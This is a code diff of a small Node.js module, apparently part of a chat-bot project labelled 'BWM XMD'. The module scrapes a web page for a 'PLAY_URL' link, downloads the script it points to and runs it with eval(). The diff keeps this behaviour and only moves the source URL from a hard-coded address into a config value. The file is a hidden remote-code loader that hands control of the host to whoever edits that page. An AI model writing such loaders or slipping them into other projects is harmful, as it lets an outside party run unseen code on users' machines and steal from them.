@@ -1,30 +1,29 @@
  // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​
 
-'use strict';
-
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchPlayUrl() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const playUrl = $(`a:contains("PLAY_URL")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!playUrl) throw new Error('PLAY_URL not found on the webpage.');
+    const playUrlElement = $('a:contains("PLAY_URL")');
+    const playUrl = playUrlElement.attr('href');
 
-        console.log('PLAY_URL fetched successfully:', playUrl);
-
-        const scriptResponse = await axios.get(playUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("PLAY_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching PLAY_URL:', error.message);
+    if (!playUrl) {
+      throw new Error('Play URL link not found...');
     }
+
+    console.log('Play URL fetched successfully ✅');
+
+    const scriptResponse = await axios.get(playUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchPlayUrl();
